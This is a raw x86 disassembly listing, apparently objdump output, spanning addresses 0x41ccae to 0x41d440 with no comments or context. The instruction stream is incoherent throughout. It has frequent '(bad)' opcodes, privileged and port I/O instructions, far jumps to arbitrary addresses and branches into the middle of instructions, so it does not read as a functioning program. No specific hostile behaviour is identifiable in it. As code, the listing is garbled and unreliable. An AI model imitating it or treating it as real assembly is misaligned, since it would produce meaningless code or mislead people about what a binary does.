  41ccae:	xor    DWORD PTR [eax-0x14],esi
  41ccb1:	and    al,0xe
  41ccb3:	cmp    esp,DWORD PTR [esp+eiz*4-0x18]
  41ccb7:	clc    
  41ccb8:	sub    dh,BYTE PTR [edx-0x18]
  41ccbb:	adc    BYTE PTR [ecx-0x10],0x48
  41ccbf:	or     BYTE PTR [ebp+0x65],dh
  41ccc2:	or     DWORD PTR [esi+ebp*2+0x3ab68cee],esp
  41ccc9:	pop    ds
  41ccca:	xchg   ecx,eax
  41cccb:	pop    esi
  41cccc:	push   0x144828d4
  41ccd1:	(bad)  
  41ccd2:	mov    fs,eax
  41ccd4:	div    BYTE PTR [esi]
  41ccd6:	push   es
  41ccd7:	jmp    0x74490ae2
  41ccdc:	pop    ds
  41ccdd:	dec    edx
  41ccde:	cmp    al,0x9d
  41cce0:	inc    edi
  41cce1:	mov    cl,0x46
  41cce3:	mov    DWORD PTR [edx],0x99ff075
  41cce9:	addr16 push 0xac0af893
  41ccef:	mov    esi,0x66133ccd
  41ccf4:	adc    BYTE PTR [ebx+eax*8+0x33],cl
  41ccf8:	pop    eax
  41ccf9:	pop    es
  41ccfa:	cdq    
  41ccfb:	mov    al,0xc9
  41ccfd:	lea    esp,[ecx+0x4b]
  41cd00:	sub    al,0x60
  41cd02:	jmp    DWORD PTR [ebp+0x8]
  41cd05:	data16 xor BYTE PTR [ebx+0x58b1ae47],ah
  41cd0c:	mov    eax,ds:0xa05f5a23
  41cd11:	or     ebx,DWORD PTR [esi]
  41cd13:	pop    eax
  41cd14:	pop    ss
  41cd15:	xchg   edx,eax
  41cd16:	xchg   edi,eax
  41cd17:	adc    al,0xea
  41cd19:	lea    ebp,[eax+0x75]
  41cd1c:	rol    DWORD PTR [edx],0x12
  41cd1f:	rcr    DWORD PTR [ecx-0x5],0x76
  41cd23:	(bad)  
  41cd24:	loopne 0x41ccce
  41cd26:	leave  
  41cd27:	mov    cs,WORD PTR [ebx]
  41cd29:	mov    eax,0x8c5cb9d3
  41cd2e:	adc    bl,ch
  41cd30:	adc    esp,DWORD PTR [eax]
  41cd32:	mov    edx,0x6a1e300b
  41cd37:	ret    0x3a21
  41cd3a:	lods   al,BYTE PTR ds:[esi]
  41cd3b:	xchg   esi,eax
  41cd3c:	pop    edi
  41cd3d:	stc    
  41cd3e:	cmp    esp,DWORD PTR [edx-0x3b]
  41cd41:	xchg   edi,eax
  41cd42:	jmp    0x46a:0x3c4183fd
  41cd49:	push   esi
  41cd4a:	popf   
  41cd4b:	pop    ss
  41cd4c:	setg   BYTE PTR [esi]
  41cd4f:	and    eax,0xbab007c0
  41cd54:	cwde   
  41cd55:	mov    eax,0x2005fb79
  41cd5a:	(bad)  
  41cd5b:	mov    DWORD PTR [ebx],0xf4754a55
  41cd61:	push   0x3
  41cd63:	sub    BYTE PTR [edi-0x3fe6eeb],dl
  41cd69:	xchg   esp,eax
  41cd6a:	mov    gs,WORD PTR [ebx+0x12923470]
  41cd70:	in     al,dx
  41cd71:	jmp    0x41cd1f
  41cd73:	xchg   esi,eax
  41cd74:	push   ecx
  41cd75:	xor    DWORD PTR es:[edi+0x79308a45],eax
  41cd7c:	push   ss
  41cd7d:	mov    edx,0x4f2fee8f
  41cd82:	mov    dl,0x4d
  41cd84:	add    bl,BYTE PTR [esi+0x490f8c6]
  41cd8a:	mov    edx,0x92e4b67e
  41cd8f:	or     eax,edi
  41cd91:	ret    0x820f
  41cd94:	inc    esp
  41cd95:	add    DWORD PTR [edi-0x507cd128],ecx
  41cd9b:	or     al,0x15
  41cd9d:	repz rcl DWORD PTR [ecx-0x5d],1
  41cda1:	scas   al,BYTE PTR es:[edi]
  41cda2:	pop    ecx
  41cda3:	mov    BYTE PTR [ecx+0x35],bl
  41cda6:	in     eax,0x56
  41cda8:	or     ebx,esp
  41cdaa:	stos   BYTE PTR es:[edi],al
  41cdab:	mov    ch,0x9e
  41cdad:	sub    al,0x47
  41cdaf:	stos   BYTE PTR es:[edi],al
  41cdb0:	sub    al,0xa3
  41cdb2:	js     0x41ce1c
  41cdb4:	and    eax,0xe1d716c7
  41cdb9:	push   cs
  41cdba:	sbb    BYTE PTR [eax],0x5d
  41cdbd:	push   esi
  41cdbe:	and    esi,ebp
  41cdc0:	int    0xc0
  41cdc2:	aam    0xcc
  41cdc4:	jle    0x41cdf2
  41cdc6:	dec    eax
  41cdc7:	ins    DWORD PTR es:[edi],dx
  41cdc8:	inc    edi
  41cdc9:	pop    ebx
  41cdca:	(bad)  
  41cdcb:	iret   
  41cdcc:	pop    ss
  41cdcd:	stos   DWORD PTR es:[edi],eax
  41cdce:	or     eax,0x5ea42624
  41cdd3:	inc    eax
  41cdd4:	and    al,0x2e
  41cdd6:	(bad)  
  41cdd7:	pop    eax
  41cdd8:	ror    DWORD PTR [eax],0x1d
  41cddb:	popf   
  41cddc:	int3   
  41cddd:	popf   
  41cdde:	lock js 0x41cd8c
  41cde1:	shl    DWORD PTR [esi],0x89
  41cde4:	mov    esi,eax
  41cde6:	push   esi
  41cde7:	add    esp,ebp
  41cde9:	add    dh,BYTE PTR [ebx+edi*4+0x5f]
  41cded:	aas    
  41cdee:	sar    BYTE PTR [edx+0x448d08c6],0xb9
  41cdf5:	in     al,dx
  41cdf6:	(bad)  
  41cdf8:	sahf   
  41cdf9:	pusha  
  41cdfa:	outs   dx,BYTE PTR ds:[esi]
  41cdfb:	(bad)  
  41cdfd:	sbb    BYTE PTR [ecx+eax*4],dl
  41ce00:	sbb    DWORD PTR [eax+0x7eebef91],edx
  41ce06:	and    eax,0x96110418
  41ce0b:	sub    dl,BYTE PTR ds:0x932c2839
  41ce11:	push   esi
  41ce12:	sbb    esp,esp
  41ce14:	or     cl,bh
  41ce16:	dec    ebp
  41ce17:	xor    BYTE PTR [eax+esi*1],bh
  41ce1a:	hlt    
  41ce1b:	mov    WORD PTR [ebp+ebx*2+0x474591e],ds
  41ce22:	jne    0x41ce32
  41ce24:	sbb    cl,BYTE PTR [eax-0x15]
  41ce27:	dec    edi
  41ce28:	leave  
  41ce29:	xor    BYTE PTR [edx+eax*1],0xec
  41ce2d:	in     al,dx
  41ce2e:	jle    0xc138d940
  41ce34:	cmp    bh,0xa7
  41ce37:	(bad)  
  41ce38:	cmc    
  41ce39:	xor    ch,BYTE PTR [edx]
  41ce3b:	inc    esp
  41ce3c:	inc    ebx
  41ce3d:	push   ss
  41ce3e:	sub    esp,DWORD PTR [edi]
  41ce40:	xor    DWORD PTR [esi],eax
  41ce42:	jge    0x41cdf7
  41ce44:	cwde   
  41ce45:	jae    0x41ce72
  41ce47:	or     esp,DWORD PTR [edi+0x7f]
  41ce4a:	mov    al,ds:0x8f68326e
  41ce4f:	add    BYTE PTR gs:[eax],al
  41ce52:	add    ebp,0xc0a3cb7b
  41ce58:	adc    DWORD PTR [ebx-0x1b],ebp
  41ce5b:	and    BYTE PTR [edx+0x3b2db98a],bh
  41ce61:	sar    BYTE PTR [ecx-0x76],1
  41ce64:	cmp    BYTE PTR [edi-0x176b0435],ch
  41ce6a:	lods   eax,DWORD PTR ds:[esi]
  41ce6b:	sbb    DWORD PTR [edi],ebx
  41ce6d:	cmp    eax,DWORD PTR [ebp+0x2263fccc]
  41ce73:	jle    0x41ce63
  41ce75:	arpl   WORD PTR [esi-0x23427e78],cx
  41ce7b:	or     al,0x2d
  41ce7d:	jne    0x41ce9b
  41ce7f:	fimul  WORD PTR [edi-0x15eccc78]
  41ce85:	gs test eax,edx
  41ce88:	and    al,0x4
  41ce8a:	add    ebp,DWORD PTR [ebx-0x8]
  41ce8d:	and    edx,DWORD PTR [eax]
  41ce8f:	sbb    al,0x23
  41ce91:	sbb    eax,DWORD PTR [eax-0x39e1321f]
  41ce97:	sbb    dh,bl
  41ce99:	sbb    BYTE PTR [ebx-0x1cb5fa22],ch
  41ce9f:	sahf   
  41cea0:	sub    esi,DWORD PTR [ebp+0x6976bf32]
  41cea6:	loop   0x41cf01
  41cea8:	es mov dl,0x5c
  41ceab:	sbb    eax,0xf42d0a0
  41ceb0:	scas   eax,DWORD PTR es:[edi]
  41ceb1:	mov    ds:0xadefd134,al
  41ceb6:	add    al,0x5c
  41ceb8:	xor    BYTE PTR [ebx+0x3],al
  41cebb:	inc    edi
  41cebc:	pop    es
  41cebd:	adc    dh,bh
  41cebf:	pop    es
  41cec0:	in     al,dx
  41cec1:	sbb    BYTE PTR [edx],0x44
  41cec4:	ror    DWORD PTR gs:[edi-0x34],1
  41cec8:	push   ebp
  41cec9:	sub    al,ch
  41cecb:	mov    eax,0x2971e023
  41ced0:	shr    esi,1
  41ced2:	inc    ebp
  41ced3:	and    ah,BYTE PTR [edx-0x12]
  41ced6:	xor    eax,DWORD PTR ds:[ebx+0x544d46a3]
  41cedd:	int3   
  41cede:	cld    
  41cedf:	add    al,0x16
  41cee1:	mov    esi,0x2e7be607
  41cee6:	je     0x41cef0
  41cee8:	cmp    esp,ebp
  41ceea:	cmp    dl,BYTE PTR [ebp+0x104accfc]
  41cef0:	dec    edi
  41cef1:	dec    eax
  41cef2:	inc    eax
  41cef3:	and    DWORD PTR [esi+0x1461e0d0],ebx
  41cef9:	or     al,0x4c
  41cefb:	jo     0x41cf42
  41cefd:	in     eax,dx
  41cefe:	imul   ebx,DWORD PTR [edi],0xffffffe0
  41cf01:	add    BYTE PTR [ecx+0x21],al
  41cf04:	shr    BYTE PTR [esp+ecx*1],0x89
  41cf08:	add    eax,0x979af7c8
  41cf0d:	cld    
  41cf0e:	mov    BYTE PTR [ebp+0x129e04a8],0xac
  41cf15:	inc    esi
  41cf16:	mov    dh,0xae
  41cf18:	int3   
  41cf19:	mov    al,0xf9
  41cf1b:	hlt    
  41cf1c:	lfs    edi,FWORD PTR [eax+0x6b9b2327]
  41cf23:	add    eax,0xc0bc1f85
  41cf28:	clc    
  41cf29:	jge    0x41cf19
  41cf2b:	mov    WORD PTR [edi+ecx*1-0x3c],gs
  41cf2f:	enter  0x8255,0x6a
  41cf33:	ficom  WORD PTR [ecx-0x72b44873]
  41cf39:	mov    edx,DWORD PTR [eax+ecx*1]
  41cf3c:	imul   ebx,DWORD PTR [eax+0x486fb806],0x4abde0
  41cf46:	add    edx,DWORD PTR cs:[ebx]
  41cf49:	scas   eax,DWORD PTR es:[edi]
  41cf4a:	enter  0x942c,0xbc
  41cf4e:	push   ecx
  41cf4f:	lods   al,BYTE PTR ds:[esi]
  41cf50:	fist   DWORD PTR ds:0x90580fdd
  41cf56:	push   esp
  41cf57:	mov    bh,0x47
  41cf59:	test   BYTE PTR [esi+ebx*2+0x9],dh
  41cf5d:	mov    al,0xab
  41cf5f:	cmp    ah,BYTE PTR [eax+0x531cff46]
  41cf65:	sbb    ah,BYTE PTR [ecx+ecx*1-0x278914e6]
  41cf6c:	inc    esp
  41cf6d:	push   eax
  41cf6e:	add    al,0x48
  41cf70:	iret   
  41cf71:	dec    eax
  41cf72:	loope  0x41cf4e
  41cf74:	mov    esi,0x4c043758
  41cf79:	pop    esp
  41cf7a:	or     DWORD PTR [eax+0x7b],edx
  41cf7d:	hlt    
  41cf7e:	add    ecx,ebx
  41cf80:	fsub   QWORD PTR [eax]
  41cf82:	pop    edx
  41cf83:	dec    ebx
  41cf84:	sub    BYTE PTR [ebx-0x68],cl
  41cf87:	inc    ecx
  41cf88:	mov    bh,0x4a
  41cf8a:	fcom   DWORD PTR [edx+0x6a6b1ab4]
  41cf90:	inc    eax
  41cf91:	icebp  
  41cf92:	add    cl,ah
  41cf94:	cmp    edx,DWORD PTR [esp+eiz*2]
  41cf97:	aam    0x2f
  41cf99:	push   0xc5e26710
  41cf9e:	or     bl,BYTE PTR [ecx]
  41cfa0:	and    ah,BYTE PTR [edx-0x1e]
  41cfa3:	adc    eax,0xdb7209d1
  41cfa8:	js     0x41cf5b
  41cfaa:	inc    esp
  41cfab:	lods   al,BYTE PTR ds:[esi]
  41cfac:	imul   esi,DWORD PTR [eax+0x7b0612a0],0xffffff9e
  41cfb3:	jp     0x41cfd6
  41cfb5:	xor    dl,BYTE PTR [ecx]
  41cfb7:	iret   
  41cfb8:	xor    eax,0xb204478d
  41cfbd:	mov    al,ds:0xfefc416e
  41cfc2:	test   bl,bl
  41cfc4:	mov    al,0xb6
  41cfc6:	lods   al,BYTE PTR ds:[esi]
  41cfc7:	mov    al,ds:0x409f1436
  41cfcc:	xchg   esi,eax
  41cfcd:	cmp    al,0x81
  41cfcf:	add    al,0x93
  41cfd1:	xchg   ebx,eax
  41cfd2:	dec    esi
  41cfd3:	js     0x41cfeb
  41cfd5:	mov    edx,0x544d1520
  41cfda:	(bad)  
  41cfdb:	in     al,0x87
  41cfdd:	add    al,0x8
  41cfdf:	out    0x7,eax
  41cfe1:	bound  esi,QWORD PTR [esi]
  41cfe3:	xchg   ebx,eax
  41cfe4:	push   ebp
  41cfe5:	xchg   ecx,eax
  41cfe6:	ret    0x252
  41cfe9:	in     al,dx
  41cfea:	jge    0x41d01b
  41cfec:	push   0xbbd83b08
  41cff1:	push   edi
  41cff2:	adc    eax,0x1332ad91
  41cff7:	(bad)  
  41cff8:	mov    ebx,0x2e0b59bd
  41cffd:	cmp    DWORD PTR [esp+ebx*1+0x1c54f38d],edx
  41d004:	enter  0x8e66,0x38
  41d008:	retf   0x94c8
  41d00b:	and    esp,DWORD PTR [ecx+ebp*1+0x23]
  41d00f:	or     al,0xbe
  41d011:	aad    0xcd
  41d013:	mov    eax,ebp
  41d015:	mov    bl,0x8
  41d017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d018:	cmp    BYTE PTR [eax+0xc],0x69
  41d01c:	jg     0x41d072
  41d01e:	out    dx,eax
  41d01f:	push   ds
  41d020:	and    esp,edi
  41d022:	ret    
  41d023:	inc    ebp
  41d024:	push   esp
  41d025:	push   cs
  41d026:	or     DWORD PTR [edx+edi*8+0x52],edx
  41d02a:	arpl   WORD PTR gs:[ecx],ax
  41d02d:	sub    al,0xac
  41d02f:	or     BYTE PTR [eax],0x44
  41d032:	sbb    al,0x40
  41d034:	stos   DWORD PTR es:[edi],eax
  41d035:	sbb    bl,dl
  41d037:	jp     0x41d0aa
  41d039:	das    
  41d03a:	ror    DWORD PTR [eax-0x730fa55b],1
  41d040:	pushw  es
  41d042:	jg     0x41d04d
  41d044:	aad    0xf3
  41d046:	imul   ebp
  41d048:	cmp    esi,DWORD PTR [ebx*8+0x75144226]
  41d04f:	icebp  
  41d050:	or     eax,0x180c8b15
  41d055:	mov    ds:0x90f946e,al
  41d05a:	push   eax
  41d05b:	in     al,dx
  41d05c:	dec    ecx
  41d05d:	jmp    0x41d07c
  41d05f:	ds aad 0x9e
  41d062:	fidiv  DWORD PTR [esi+eax*8+0x22]
  41d066:	push   esp
  41d067:	cld    
  41d068:	outs   dx,DWORD PTR ds:[esi]
  41d069:	inc    esi
  41d06a:	ror    BYTE PTR [ebx+0x1ecbfd05],1
  41d070:	xchg   ebx,eax
  41d071:	lods   al,BYTE PTR ds:[esi]
  41d072:	mov    DWORD PTR [eax+0xc],esi
  41d075:	pop    ecx
  41d076:	xor    edi,DWORD PTR [edi+0x0]
  41d079:	mov    edx,DWORD PTR [ebp+edi*4-0x2c]
  41d07d:	push   cs
  41d07e:	or     dl,BYTE PTR [esp+ebx*1-0x80]
  41d082:	fidiv  DWORD PTR ds:0x285361b8
  41d088:	sar    dh,1
  41d08a:	retf   0x36e
  41d08d:	adc    BYTE PTR [edx-0x14],cl
  41d090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d091:	call   0x7257f9cd
  41d096:	adc    ch,bl
  41d098:	sub    al,0x9a
  41d09a:	mov    ebx,gs
  41d09c:	sub    eax,DWORD PTR [edi]
  41d09e:	add    ah,BYTE PTR [edx-0x30]
  41d0a1:	pusha  
  41d0a2:	nop
  41d0a3:	jbe    0x41d0d6
  41d0a5:	(bad)  
  41d0a6:	cs push esp
  41d0a8:	jge    0x41d09f
  41d0aa:	inc    edx
  41d0ab:	xor    al,0xe
  41d0ad:	mov    eax,DWORD PTR [eax]
  41d0af:	imul   eax,DWORD PTR [ebp+0x2ddd95b0],0x39
  41d0b6:	jmp    0x41d0bf
  41d0b8:	or     BYTE PTR [esp+ebp*2-0x63e3db9],dl
  41d0bf:	xor    bh,0x1e
  41d0c2:	push   0x91e09b73
  41d0c7:	mov    ah,BYTE PTR [esi+0x7d]
  41d0ca:	xchg   ebp,eax
  41d0cb:	cld    
  41d0cc:	lock test BYTE PTR [eax],bl
  41d0cf:	adc    BYTE PTR ds:0x73e095c8,ch
  41d0d5:	mov    edi,DWORD PTR [eax+0x2a]
  41d0d8:	mov    esp,0x7782822a
  41d0dd:	rcl    BYTE PTR [esi],1
  41d0df:	adc    al,0xa2
  41d0e1:	inc    ecx
  41d0e2:	popf   
  41d0e3:	cld    
  41d0e4:	jmp    0x41d08f
  41d0e6:	pop    ebx
  41d0e7:	cs fcmovnbe st,st(6)
  41d0ea:	or     eax,ebp
  41d0ec:	in     al,dx
  41d0ed:	push   es
  41d0ee:	lock jge 0x41d0e5
  41d0f1:	clc    
  41d0f2:	or     ecx,0xffffffb3
  41d0f5:	cdq    
  41d0f6:	pop    edx
  41d0f7:	adc    al,0x4b
  41d0f9:	sub    ah,al
  41d0fb:	cld    
  41d0fc:	inc    esi
  41d0fd:	aam    0x77
  41d0ff:	in     al,dx
  41d100:	dec    ebp
  41d101:	loopne 0x41d0fc
  41d103:	push   edi
  41d104:	hlt    
  41d105:	xchg   edx,eax
  41d106:	lock dec ecx
  41d108:	add    dl,al
  41d10a:	add    BYTE PTR [edi],0x95
  41d10d:	out    0xb6,eax
  41d10f:	bound  ebx,QWORD PTR [edi]
  41d111:	js     0x41d0d7
  41d113:	add    al,ch
  41d115:	ds repz mov esp,ecx
  41d119:	data16 mov cl,0x1d
  41d11c:	inc    ecx
  41d11d:	dec    ebp
  41d11e:	ins    DWORD PTR es:[edi],dx
  41d11f:	add    BYTE PTR [ebx+edi*4-0x15aebd1e],bh
  41d126:	sub    BYTE PTR [ebp+0x4c17d99],dl
  41d12c:	sbb    DWORD PTR [ecx+0x42],esp
  41d12f:	iret   
  41d130:	loopne 0x41d0c7
  41d132:	in     al,dx
  41d133:	pop    ds
  41d134:	addr16 call 0x1d3d0bba
  41d13a:	pop    eax
  41d13b:	push   esp
  41d13c:	jo     0x41d126
  41d13e:	xor    eax,0x90646400
  41d143:	inc    ecx
  41d144:	std    
  41d145:	pop    ecx
  41d146:	push   ebx
  41d147:	push   ebp
  41d148:	cmp    esp,0x21
  41d14b:	jg     0x41d189
  41d14d:	dec    eax
  41d14e:	je     0x41d198
  41d150:	jmp    0x41d1a7
  41d152:	xor    esi,DWORD PTR [edi+esi*1-0x15]
  41d156:	inc    edi
  41d157:	xor    eax,0x233f2337
  41d15c:	sub    BYTE PTR [esi],dl
  41d15e:	jmp    0x41d18f
  41d160:	and    eax,0x5921eb1d
  41d165:	xchg   esi,eax
  41d166:	gs sti 
  41d168:	mov    al,0x3
  41d16a:	ret    
  41d16b:	mov    al,0x4
  41d16d:	add    al,BYTE PTR ds:0x65080706
  41d173:	pop    ecx
  41d174:	xchg   esi,eax
  41d175:	or     DWORD PTR gs:[ebx],ecx
  41d178:	or     al,0xd
  41d17a:	push   cs
  41d17b:	mov    WORD PTR [eax-0x4e],?
  41d17e:	mov    ds:0x30960716,al
  41d183:	test   al,0x8b
  41d185:	xor    cl,BYTE PTR [edi]
  41d187:	push   esp
  41d188:	cwde   
  41d189:	mov    DWORD PTR [ebx-0x74],edx
  41d18c:	fs fs jnp 0x41d196
  41d190:	inc    esi
  41d191:	or     BYTE PTR ds:0x8391a8b0,al
  41d197:	adc    eax,0x983dac67
  41d19c:	pop    edx
  41d19e:	push   es
  41d19f:	fist   WORD PTR [ecx]
  41d1a1:	gs pop eax
  41d1a3:	cld    
  41d1a4:	cmp    DWORD PTR [ebx+0x14],0xffffff87
  41d1a8:	setae  BYTE PTR [edi]
  41d1ab:	xchg   ebx,eax
  41d1ac:	adc    BYTE PTR [ecx+0x48],bh
  41d1af:	pop    eax
  41d1b0:	mov    ds:0xc09543b8,al
  41d1b5:	add    DWORD PTR [ecx-0xd3b08e8],0xb833c014
  41d1bf:	or     ecx,DWORD PTR [eax+edx*2]
  41d1c2:	les    edi,FWORD PTR [ebp-0x14]
  41d1c5:	add    BYTE PTR [ebx-0x7a6f06bf],al
  41d1cb:	mov    dh,0xa9
  41d1cd:	xlat   BYTE PTR ds:[ebx]
  41d1ce:	mov    edx,0x47630660
  41d1d3:	loopne 0x41d17c
  41d1d5:	jo     0x41d170
  41d1d7:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1d9:	xor    esi,0xfed832a4
  41d1df:	(bad)  
  41d1e0:	push   ebp
  41d1e1:	mov    ebp,0x8d8db106
  41d1e6:	and    DWORD PTR ds:0x64d82f07,ebp
  41d1ec:	add    al,0x8b
  41d1ee:	adc    eax,0xb19ae6b5
  41d1f3:	ror    DWORD PTR [edx+0x63],0xc0
  41d1f7:	mov    esp,0xed0bc039
  41d1fc:	fs ins BYTE PTR es:[edi],dx
  41d1fe:	or     al,0x12
  41d200:	les    ecx,FWORD PTR [edi]
  41d202:	enter  0x59f8,0xa2
  41d206:	js     0x41d19b
  41d208:	xchg   ecx,eax
  41d209:	int3   
  41d20a:	shl    BYTE PTR [esi+0x77],1
  41d20d:	repnz mov ebp,0xf6464ed6
  41d213:	shl    eax,0x8d
  41d216:	shufps xmm1,XMMWORD PTR [esi],0x72
  41d21a:	mov    WORD PTR [esi+edx*2],?
  41d21d:	sub    al,0xeb
  41d21f:	pop    ebp
  41d220:	cwde   
  41d221:	nop
  41d222:	xor    dh,BYTE PTR [edx]
  41d224:	jbe    0x41d1ec
  41d226:	ds xchg esp,eax
  41d228:	pop    esi
  41d229:	cwde   
  41d22a:	pushf  
  41d22b:	mov    WORD PTR [esp+ecx*4-0x6f5b5fb4],ds
  41d232:	add    ah,BYTE PTR ds:0x8cb20c83
  41d238:	mov    esp,0x2cbf908c
  41d23d:	and    BYTE PTR [ecx],al
  41d23f:	cwde   
  41d240:	xchg   esi,eax
  41d241:	lea    eax,[ebp+0x202f1f8c]
  41d247:	ret    0x5f91
  41d24a:	scas   al,BYTE PTR es:[edi]
  41d24b:	push   esp
  41d24c:	sub    al,0xa9
  41d24e:	xor    ah,BYTE PTR [edx*8+0x248a0cdf]
  41d255:	inc    esp
  41d256:	das    
  41d257:	cdq    
  41d258:	push   ds
  41d259:	xor    BYTE PTR [esi+0x65b993c],al
  41d25f:	rol    BYTE PTR [ebx-0x3b91213e],1
  41d265:	lea    edx,[edi-0x16]
  41d268:	or     bh,dh
  41d26a:	sbb    eax,0x730a074a
  41d26f:	and    dh,bh
  41d271:	mov    ebx,0xf1c1900d
  41d276:	cmp    edx,DWORD PTR [ebp+0x33]
  41d279:	enter  0xa59,0x6
  41d27d:	imul   edx,DWORD PTR [edx],0x6b5f3050
  41d283:	hlt    
  41d284:	ss enter 0x5966,0x0
  41d289:	lock inc esi
  41d28b:	cwde   
  41d28c:	lock iret 
  41d28e:	in     al,0x59
  41d290:	add    al,0x39
  41d292:	push   ecx
  41d293:	pushf  
  41d294:	xor    BYTE PTR [ecx+0x44],dl
  41d297:	and    DWORD PTR [edx+0x2d063870],esp
  41d29d:	inc    eax
  41d29e:	test   BYTE PTR [ebp-0x66d0dfa5],dl
  41d2a4:	(bad)  
  41d2a5:	retf   
  41d2a6:	or     DWORD PTR [eax-0x13370bb9],eax
  41d2ac:	push   ds
  41d2ad:	sub    eax,DWORD PTR [esi-0x72]
  41d2b0:	mov    WORD PTR [edi+ebx*2],ss
  41d2b3:	fcom   DWORD PTR [eax-0x70]
  41d2b6:	mov    ds:0xbdf91c93,eax
  41d2bb:	xchg   DWORD PTR [esi],edx
  41d2bd:	inc    edi
  41d2be:	xchg   esp,eax
  41d2bf:	push   ebp
  41d2c0:	sbb    BYTE PTR [eax+0x7c40d7ef],dl
  41d2c6:	xchg   esi,eax
  41d2c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2c8:	dec    ecx
  41d2c9:	xchg   esp,eax
  41d2ca:	mov    eax,ds:0x7c0a0847
  41d2cf:	ins    DWORD PTR es:[edi],dx
  41d2d0:	push   ss
  41d2d1:	fistp  WORD PTR [ecx-0x3a33ea94]
  41d2d7:	jg     0x41d2f0
  41d2d9:	add    BYTE PTR [esi+ebp*8],dl
  41d2dc:	out    0xfb,eax
  41d2de:	xchg   esi,eax
  41d2df:	mov    ah,0xa
  41d2e1:	or     al,0x98
  41d2e3:	mov    al,ds:0xf2a60fb8
  41d2e8:	stc    
  41d2e9:	dec    BYTE PTR [eax]
  41d2eb:	inc    edi
  41d2ec:	test   al,0x89
  41d2ee:	add    cl,BYTE PTR [esp+ebx*1]
  41d2f1:	inc    esi
  41d2f2:	xchg   esp,eax
  41d2f3:	(bad)  
  41d2f4:	jl     0x41d30d
  41d2f6:	jmp    0x7a1:0x1a6cad40
  41d2fd:	(bad)  
  41d2fe:	push   eax
  41d2ff:	lds    ecx,FWORD PTR [edx]
  41d301:	adc    al,0xa8
  41d303:	or     BYTE PTR [eax+0x263b58b1],dl
  41d309:	(bad)  
  41d30a:	(bad)  
  41d30b:	and    dl,BYTE PTR [eax+0x6437ecd9]
  41d311:	nop
  41d312:	mov    al,0x22
  41d314:	dec    eax
  41d315:	and    bl,BYTE PTR [ebx-0x799c841c]
  41d31b:	mov    ds:0x11080881,eax
  41d320:	int3   
  41d321:	pushf  
  41d322:	inc    ebx
  41d323:	push   cs
  41d324:	cmp    eax,DWORD PTR [eax]
  41d326:	or     BYTE PTR [eax+ebp*4],cl
  41d329:	mov    dh,0xa0
  41d32b:	pop    esp
  41d32c:	cmp    dl,BYTE PTR [ebx]
  41d32e:	mov    al,0x6c
  41d330:	jmp    DWORD PTR [ebp-0x6c]
  41d333:	rcl    al,0x57
  41d336:	push   eax
  41d337:	leave  
  41d338:	inc    eax
  41d339:	jno    0x41d30e
  41d33b:	jge    0x41d38e
  41d33d:	mov    eax,0x8bc96f3
  41d342:	add    al,0xe2
  41d344:	in     eax,dx
  41d345:	cmp    eax,0xc408c0cd
  41d34a:	mov    ss,WORD PTR [edi]
  41d34c:	add    DWORD PTR [ebp+0x10],esi
  41d34f:	add    ch,BYTE PTR [edi-0x6f8e7d4]
  41d355:	call   DWORD PTR [esi]
  41d357:	push   ecx
  41d358:	add    al,ch
  41d35a:	(bad)  
  41d35b:	fimul  WORD PTR [ecx]
  41d35d:	(bad)  
  41d35f:	mov    eax,0x6f76cc04
  41d364:	enter  0x5d97,0x14
  41d368:	mov    ecx,0xef5f0080
  41d36d:	cmp    eax,DWORD PTR ds:0xfd9fbf68
  41d373:	dec    esp
  41d374:	jl     0x41d389
  41d376:	pop    es
  41d377:	jne    0x41d381
  41d379:	cmp    edx,DWORD PTR ds:0xc8037e53
  41d37f:	imul   ebp,DWORD PTR [edi+0x1fba895c],0xffffffe0
  41d386:	fwait
  41d387:	sbb    BYTE PTR [edx+0x0],0x1a
  41d38b:	mov    edx,0x113c8066
  41d390:	pusha  
  41d391:	xchg   DWORD PTR [eax+eiz*8],edx
  41d394:	pop    ss
  41d395:	mov    WORD PTR cs:[eax+0x4c],gs
  41d399:	call   0x674e:0xf78b48eb
  41d3a0:	jg     0x41d345
  41d3a2:	fidivr DWORD PTR [esi+ecx*2+0xc8a12c4]
  41d3a9:	xor    BYTE PTR [ecx-0x2ef2e01f],al
  41d3af:	push   ss
  41d3b0:	cmp    BYTE PTR [esi],0x72
  41d3b3:	jmp    0x1654a1c2
  41d3b8:	vandnps ymm0,ymm4,YMMWORD PTR [ecx+edi*2-0x367cb6fb]
  41d3c1:	inc    BYTE PTR [ecx-0x55]
  41d3c4:	inc    ecx
  41d3c5:	cdq    
  41d3c6:	mov    al,0xff
  41d3c8:	add    al,0xb2
  41d3ca:	add    ch,bl
  41d3cc:	adc    ecx,DWORD PTR [edx+0x2493804]
  41d3d2:	push   esi
  41d3d3:	les    esp,FWORD PTR [ecx-0x4550b956]
  41d3d9:	mov    ds:0xbd18acc4,al
  41d3de:	outs   dx,DWORD PTR ds:[esi]
  41d3df:	inc    eax
  41d3e0:	adc    esi,DWORD PTR [esp+eax*4]
  41d3e3:	mov    ds:0xec49b04,al
  41d3e8:	sti    
  41d3e9:	push   esp
  41d3ea:	adc    esi,DWORD PTR [ebx]
  41d3ec:	leave  
  41d3ed:	sbb    eax,0x62101307
  41d3f2:	fst    DWORD PTR [esi+0x45]
  41d3f5:	sar    DWORD PTR [ebx],0xcc
  41d3f8:	add    BYTE PTR [esi],al
  41d3fa:	cmp    DWORD PTR [eax-0x10],0xf0b2097e
  41d401:	sbb    BYTE PTR [edx-0x30],dl
  41d404:	xor    esp,DWORD PTR [ebx]
  41d406:	fwait
  41d407:	call   0xfa6e04bb
  41d40c:	pop    es
  41d40d:	mov    esi,0x7eff85ed
  41d412:	inc    esi
  41d413:	pop    esi
  41d414:	add    BYTE PTR [edi-0x1010bbd3],al
  41d41a:	pop    eax
  41d41b:	xor    BYTE PTR [ecx+ecx*1],bl
  41d41e:	lock in eax,dx
  41d420:	int3   
  41d421:	and    BYTE PTR [ebx],bh
  41d423:	sti    
  41d424:	jl     0x41d44b
  41d426:	cmp    ecx,DWORD PTR ds:0xe8b9a26b
  41d42c:	pusha  
  41d42d:	ins    DWORD PTR es:[edi],dx
  41d42e:	mov    ecx,0x50052445
  41d433:	and    BYTE PTR [eax+0x7d],0x4e
  41d437:	push   eax
  41d438:	and    DWORD PTR [ebx+0x93b6f26],esp
  41d43e:	dec    esi
  41d43f:	pusha  
  41d440:	call   0x5725:0x541c5c60
